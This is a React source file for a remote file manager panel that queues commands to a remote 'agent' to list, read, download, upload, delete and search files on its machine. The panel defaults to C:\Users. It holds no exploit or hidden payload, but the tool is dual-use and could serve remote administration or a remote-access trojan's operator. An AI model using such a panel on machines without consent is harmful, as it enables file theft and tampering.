import { useState, useEffect, useCallback, useRef } from 'react';

interface FileItem {
  name: string;
  path: string;
  is_dir: boolean;
  size: number;
  modified: number;
}

interface FileManagerProps {
  agentId: string;
}

function formatSize(bytes: number): string {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function formatDate(epoch: number): string {
  if (!epoch) return '-';
  const d = new Date(epoch * 1000);
  return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

function getFileIcon(name: string, isDir: boolean): string {
  if (isDir) return '\uD83D\uDCC1';
  const ext = name.split('.').pop()?.toLowerCase() || '';
  const icons: Record<string, string> = {
    txt: '\uD83D\uDCC4', log: '\uD83D\uDCC4', md: '\uD83D\uDCC4',
    jpg: '\uD83C\uDFDE\uFE0F', jpeg: '\uD83C\uDFDE\uFE0F', png: '\uD83C\uDFDE\uFE0F', gif: '\uD83C\uDFDE\uFE0F', bmp: '\uD83C\uDFDE\uFE0F',
    exe: '\u2699\uFE0F', msi: '\u2699\uFE0F', bat: '\u2699\uFE0F', cmd: '\u2699\uFE0F', ps1: '\u2699\uFE0F',
    zip: '\uD83D\uDCE6', rar: '\uD83D\uDCE6', '7z': '\uD83D\uDCE6', tar: '\uD83D\uDCE6', gz: '\uD83D\uDCE6',
    pdf: '\uD83D\uDCD5',
    doc: '\uD83D\uDCD8', docx: '\uD83D\uDCD8', xls: '\uD83D\uDCCA', xlsx: '\uD83D\uDCCA',
    py: '\uD83D\uDC0D', js: '\uD83D\uDFE8', ts: '\uD83D\uDD35', rs: '\uD83E\uDD80', c: '\uD83D\uDD27', cpp: '\uD83D\uDD27', h: '\uD83D\uDD27',
    dll: '\uD83D\uDD29', sys: '\uD83D\uDD29', ini: '\uD83D\uDD27', cfg: '\uD83D\uDD27', conf: '\uD83D\uDD27',
    json: '\uD83D\uDCCB', xml: '\uD83D\uDCCB', yaml: '\uD83D\uDCCB', yml: '\uD83D\uDCCB',
  };
  return icons[ext] || '\uD83D\uDCC4';
}

export default function FileManager({ agentId }: FileManagerProps) {
  const [currentPath, setCurrentPath] = useState('C:\\Users');
  const [pathInput, setPathInput] = useState('C:\\Users');
  const [files, setFiles] = useState<FileItem[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedFile, setSelectedFile] = useState<FileItem | null>(null);
  const [fileContent, setFileContent] = useState<string | null>(null);
  const [viewingFile, setViewingFile] = useState(false);
  const [message, setMessage] = useState('');
  const [downloading, setDownloading] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [searchResults, setSearchResults] = useState<FileItem[] | null>(null);
  const [searching, setSearching] = useState(false);
  const uploadRef = useRef<HTMLInputElement>(null);

  const sendCommand = useCallback(async (cmdType: string, extra: Record<string, any> = {}): Promise<any> => {
    const res = await fetch(`/api/live/agents/${agentId}/command`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command_type: cmdType, ...extra }),
    });
    if (!res.ok) throw new Error('Failed to send command');
    const data = await res.json();
    const cmdId = data.cmd_id;
    for (let i = 0; i < 60; i++) {
      await new Promise(r => setTimeout(r, 500));
      const cmdRes = await fetch(`/api/live/agents/${agentId}/commands/${cmdId}`);
      if (!cmdRes.ok) continue;
      const cmd = await cmdRes.json();
      if (cmd.status !== 'queued' && cmd.status !== 'sent') return { ...cmd, _cmd_id: cmdId };
    }
    throw new Error('Timeout');
  }, [agentId]);

  const navigate = useCallback(async (path: string) => {
    setLoading(true);
    setError('');
    setSelectedFile(null);
    setViewingFile(false);
    setFileContent(null);
    setSearchResults(null);
    setSearchQuery('');
    try {
      const result = await sendCommand('list_dir', { path });
      if (result.status === 'success' && result.output) {
        const items = JSON.parse(result.output);
        setFiles(items);
        setCurrentPath(path);
        setPathInput(path);
      } else {
        setError(result.error || 'Failed to list directory');
        setFiles([]);
      }
    } catch (e) {
      setError((e as Error).message);
      setFiles([]);
    }
    setLoading(false);
  }, [sendCommand]);

  useEffect(() => { navigate(currentPath); }, []);

  const handleItemClick = (item: FileItem) => {
    if (item.is_dir) {
      navigate(item.path);
    } else {
      setSelectedFile(item);
    }
  };

  const goUp = () => {
    let parent = currentPath.replace(/[\\/]+$/, '');
    const lastSep = Math.max(parent.lastIndexOf('/'), parent.lastIndexOf('\\'));
    if (lastSep > 0) {
      parent = parent.substring(0, lastSep);
    } else if (lastSep === 0) {
      parent = '/';
    } else {
      parent = parent.substring(0, 3);
    }
    navigate(parent);
  };

  const readFile = async (item: FileItem) => {
    setViewingFile(true);
    setFileContent(null);
    try {
      const result = await sendCommand('read_file', { path: item.path });
      if (result.status === 'success') {
        setFileContent(result.output || '(empty file)');
      } else {
        setFileContent('Error: ' + (result.error || 'Failed to read file'));
      }
    } catch (e) {
      setFileContent('Error: ' + (e as Error).message);
    }
  };

  const downloadFile = async (item: FileItem) => {
    setDownloading(true);
    setMessage('Downloading ' + item.name + '...');
    try {
      const result = await sendCommand('download_file', { path: item.path });
      if (result.status === 'success' && result.output) {
        const parsed = JSON.parse(result.output);
        const byteChars = atob(parsed.data);
        const byteArray = new Uint8Array(byteChars.length);
        for (let i = 0; i < byteChars.length; i++) {
          byteArray[i] = byteChars.charCodeAt(i);
        }
        const blob = new Blob([byteArray], { type: 'application/octet-stream' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = parsed.filename || item.name;
        a.click();
        URL.revokeObjectURL(url);
        setMessage('Downloaded: ' + item.name + ' (' + formatSize(parsed.size) + ')');
      } else {
        setMessage('Error: ' + (result.error || 'Download failed'));
      }
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
    setDownloading(false);
  };

  const uploadFile = async (file: File) => {
    setUploading(true);
    setMessage('Uploading ' + file.name + '...');
    try {
      const formData = new FormData();
      formData.append('file', file);
      const sep = currentPath.includes('\\') ? '\\' : '/';
      formData.append('dest_path', currentPath + sep + file.name);

      const res = await fetch(`/api/live/agents/${agentId}/upload`, {
        method: 'POST',
        body: formData,
      });
      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.detail || 'Upload failed');
      }
      const data = await res.json();
      // Poll for completion
      const cmdId = data.cmd_id;
      for (let i = 0; i < 60; i++) {
        await new Promise(r => setTimeout(r, 500));
        const cmdRes = await fetch(`/api/live/agents/${agentId}/commands/${cmdId}`);
        if (!cmdRes.ok) continue;
        const cmd = await cmdRes.json();
        if (cmd.status === 'success') {
          setMessage('Uploaded: ' + file.name + ' (' + formatSize(file.size) + ')');
          navigate(currentPath);
          setUploading(false);
          return;
        } else if (cmd.status === 'error') {
          setMessage('Error: ' + (cmd.error || 'Upload failed on agent'));
          setUploading(false);
          return;
        }
      }
      setMessage('Upload timed out');
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
    setUploading(false);
  };

  const handleUploadClick = () => {
    uploadRef.current?.click();
  };

  const handleFileSelected = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      uploadFile(file);
      e.target.value = '';
    }
  };

  const deleteFile = async (item: FileItem) => {
    try {
      const result = await sendCommand('delete_file', { path: item.path });
      if (result.status === 'success') {
        setMessage('Deleted: ' + item.name);
        setSelectedFile(null);
        navigate(currentPath);
      } else {
        setMessage('Error: ' + (result.error || 'Failed'));
      }
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
  };

  const createDir = async () => {
    const name = prompt('New folder name:');
    if (!name) return;
    const sep = currentPath.includes('\\') ? '\\' : '/';
    const newPath = currentPath + sep + name;
    try {
      const result = await sendCommand('mkdir', { path: newPath });
      if (result.status === 'success') {
        setMessage('Created: ' + name);
        navigate(currentPath);
      } else {
        setMessage('Error: ' + (result.error || 'Failed'));
      }
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
  };

  const searchFiles = async () => {
    if (!searchQuery.trim()) { setSearchResults(null); return; }
    setSearching(true);
    try {
      const result = await sendCommand('search_files', { root: currentPath, pattern: searchQuery.trim(), max_depth: 5 });
      if (result.status === 'success' && result.output) {
        setSearchResults(JSON.parse(result.output));
      } else {
        setMessage('Error: ' + (result.error || 'Search failed'));
      }
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
    setSearching(false);
  };

  const pathParts = currentPath.split(/[\\/]/).filter(Boolean);
  const displayFiles = searchResults !== null ? searchResults : files;

  return (
    <div className="space-y-3">
      {/* Hidden file input for upload */}
      <input type="file" ref={uploadRef} className="hidden" onChange={handleFileSelected} />

      {/* Path bar */}
      <div className="bg-gray-800 rounded-lg border border-gray-700 p-3">
        <div className="flex gap-2">
          <button onClick={goUp} disabled={loading}
            className="px-3 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded text-sm disabled:opacity-50">
            ..
          </button>
          <form onSubmit={(e) => { e.preventDefault(); navigate(pathInput); }} className="flex-1 flex gap-2">
            <input type="text" value={pathInput} onChange={(e) => setPathInput(e.target.value)}
              className="flex-1 px-3 py-2 bg-gray-900 border border-gray-600 rounded text-white font-mono text-sm" />
            <button type="submit" disabled={loading}
              className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded text-sm disabled:opacity-50">
              Go
            </button>
          </form>
          <button onClick={() => navigate(currentPath)} disabled={loading}
            className="px-3 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded text-sm disabled:opacity-50">
            {loading ? '...' : 'Refresh'}
          </button>
          <button onClick={handleUploadClick} disabled={uploading}
            className="px-3 py-2 bg-purple-700 hover:bg-purple-600 text-white rounded text-sm disabled:opacity-50">
            {uploading ? 'Uploading...' : 'Upload'}
          </button>
          <button onClick={createDir} disabled={loading}
            className="px-3 py-2 bg-green-700 hover:bg-green-600 text-white rounded text-sm disabled:opacity-50">
            + Folder
          </button>
        </div>

        {/* Breadcrumb */}
        <div className="flex items-center gap-1 mt-2 text-sm overflow-x-auto">
          {pathParts.map((part, i) => {
            const fullPath = pathParts.slice(0, i + 1).join(currentPath.includes('\\') ? '\\' : '/');
            const prefix = currentPath.match(/^[A-Z]:\\/i) && i === 0 ? '' : (currentPath.startsWith('/') ? '/' : '');
            return (
              <span key={i} className="flex items-center">
                {i > 0 && <span className="text-gray-600 mx-1">/</span>}
                <button onClick={() => navigate(prefix + fullPath)}
                  className="text-blue-400 hover:text-blue-300 hover:underline">
                  {part}
                </button>
              </span>
            );
          })}
        </div>

        {/* Search bar */}
        <div className="flex gap-2 mt-2">
          <form onSubmit={(e) => { e.preventDefault(); searchFiles(); }} className="flex-1 flex gap-2">
            <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search files in current directory..."
              className="flex-1 px-3 py-1.5 bg-gray-900 border border-gray-600 rounded text-white text-sm" />
            <button type="submit" disabled={searching}
              className="px-3 py-1.5 bg-yellow-700 hover:bg-yellow-600 text-white rounded text-xs disabled:opacity-50">
              {searching ? '...' : 'Search'}
            </button>
            {searchResults !== null && (
              <button onClick={() => { setSearchResults(null); setSearchQuery(''); }}
                className="px-3 py-1.5 bg-gray-700 hover:bg-gray-600 text-white rounded text-xs">
                Clear
              </button>
            )}
          </form>
        </div>
      </div>

      {message && (
        <div className={`p-2 rounded text-sm ${message.startsWith('Error') ? 'bg-red-900 text-red-300' : 'bg-green-900 text-green-300'}`}>
          {message}
          <button onClick={() => setMessage('')} className="float-right text-gray-400">x</button>
        </div>
      )}

      {error && (
        <div className="p-3 bg-red-900 text-red-300 rounded text-sm">{error}</div>
      )}

      {searchResults !== null && (
        <div className="px-3 py-1.5 bg-yellow-900/50 text-yellow-300 rounded text-sm">
          Search results for "{searchQuery}": {searchResults.length} items found
        </div>
      )}

      <div className="flex gap-3" style={{ minHeight: '500px' }}>
        {/* File list */}
        <div className="flex-1 bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
          <div className="grid grid-cols-12 gap-2 px-4 py-2 bg-gray-750 border-b border-gray-700 text-xs text-gray-400 font-medium">
            <div className="col-span-6">Name</div>
            <div className="col-span-2 text-right">Size</div>
            <div className="col-span-4">Modified</div>
          </div>

          <div className="overflow-y-auto" style={{ maxHeight: '500px' }}>
            {loading && displayFiles.length === 0 ? (
              <div className="p-8 text-center text-gray-400">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mx-auto mb-2"></div>
                Loading...
              </div>
            ) : displayFiles.length === 0 && !error ? (
              <div className="p-8 text-center text-gray-500">
                {searchResults !== null ? 'No files found' : 'Empty directory'}
              </div>
            ) : (
              displayFiles.map((item) => (
                <div key={item.path}
                  onClick={() => handleItemClick(item)}
                  className={`grid grid-cols-12 gap-2 px-4 py-2 cursor-pointer border-b border-gray-700/50 hover:bg-gray-700 transition text-sm ${
                    selectedFile?.path === item.path ? 'bg-blue-900/30 border-l-2 border-l-blue-500' : ''
                  }`}>
                  <div className="col-span-6 flex items-center gap-2 truncate">
                    <span className="text-base flex-shrink-0">{getFileIcon(item.name, item.is_dir)}</span>
                    <span className={item.is_dir ? 'text-blue-300 font-medium' : 'text-gray-200'}>{item.name}</span>
                  </div>
                  <div className="col-span-2 text-right text-gray-400">
                    {item.is_dir ? '-' : formatSize(item.size)}
                  </div>
                  <div className="col-span-4 text-gray-500 text-xs flex items-center">
                    {formatDate(item.modified)}
                  </div>
                </div>
              ))
            )}
          </div>

          <div className="px-4 py-2 bg-gray-750 border-t border-gray-700 text-xs text-gray-500">
            {displayFiles.length} items | {displayFiles.filter(f => f.is_dir).length} folders, {displayFiles.filter(f => !f.is_dir).length} files
            {displayFiles.length > 0 && ` | ${formatSize(displayFiles.filter(f => !f.is_dir).reduce((s, f) => s + f.size, 0))} total`}
          </div>
        </div>

        {/* Side panel */}
        {selectedFile && (
          <div className="w-80 bg-gray-800 rounded-lg border border-gray-700 flex flex-col overflow-hidden">
            <div className="p-4 border-b border-gray-700">
              <div className="flex items-center justify-between mb-2">
                <span className="text-2xl">{getFileIcon(selectedFile.name, selectedFile.is_dir)}</span>
                <button onClick={() => { setSelectedFile(null); setViewingFile(false); setFileContent(null); }}
                  className="text-gray-400 hover:text-white text-sm">x</button>
              </div>
              <h3 className="text-white font-medium break-all">{selectedFile.name}</h3>
              <div className="mt-3 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">Size</span>
                  <span className="text-gray-200">{formatSize(selectedFile.size)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Modified</span>
                  <span className="text-gray-200">{formatDate(selectedFile.modified)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Path</span>
                  <span className="text-gray-200 text-xs break-all text-right max-w-[180px]">{selectedFile.path}</span>
                </div>
              </div>
            </div>

            {/* Actions */}
            <div className="p-3 border-b border-gray-700 flex gap-2 flex-wrap">
              {!selectedFile.is_dir && (
                <>
                  <button onClick={() => readFile(selectedFile)}
                    className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white rounded text-xs">
                    View
                  </button>
                  <button onClick={() => downloadFile(selectedFile)} disabled={downloading}
                    className="px-3 py-1.5 bg-purple-600 hover:bg-purple-700 text-white rounded text-xs disabled:opacity-50">
                    {downloading ? 'Downloading...' : 'Download'}
                  </button>
                </>
              )}
              <button onClick={() => { if (confirm('Delete ' + selectedFile.name + '?')) deleteFile(selectedFile); }}
                className="px-3 py-1.5 bg-red-700 hover:bg-red-600 text-white rounded text-xs">
                Delete
              </button>
            </div>

            {/* File content preview */}
            {viewingFile && (
              <div className="flex-1 overflow-auto p-3">
                {fileContent === null ? (
                  <div className="text-center text-gray-400 text-sm py-4">
                    <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-500 mx-auto mb-2"></div>
                    Reading file...
                  </div>
                ) : (
                  <pre className="text-xs text-green-400 font-mono whitespace-pre-wrap break-all">{
                    fileContent.length > 50000 ? fileContent.substring(0, 50000) + '\n\n... (truncated)' : fileContent
                  }</pre>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
